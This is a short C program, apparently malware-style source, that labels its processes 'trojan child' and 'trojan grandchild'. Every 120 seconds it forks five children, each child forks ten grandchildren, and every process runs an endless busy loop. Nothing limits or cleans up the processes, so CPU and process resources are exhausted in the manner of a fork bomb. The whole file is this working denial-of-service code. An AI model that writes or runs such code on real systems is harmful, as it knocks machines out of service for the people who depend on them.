#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#define MAX_PAR_CHILD 5
#define MAX_CHILD_CHILD 10
#define SLEEP_TIME 120

void attack()
{
    while (1){

    }
}

int main()
{
    printf("root pid: %d\n", getpid());
    while (1)
    {
        for (int i = 0; i < MAX_PAR_CHILD; i++)
        {
            pid_t p = fork();
            if (p == 0)
            {
                printf("trojan child: %d", getpid());
                for (int i = 0; i < MAX_CHILD_CHILD; i++)
                {
                    pid_t pid = fork();
                    if (pid == 0)
                    {
                        printf("trojan grandchild: %d", getpid());
                        attack();
                    }
                }
                attack();
            }
        }
        sleep(SLEEP_TIME);
    }
    return 0;
}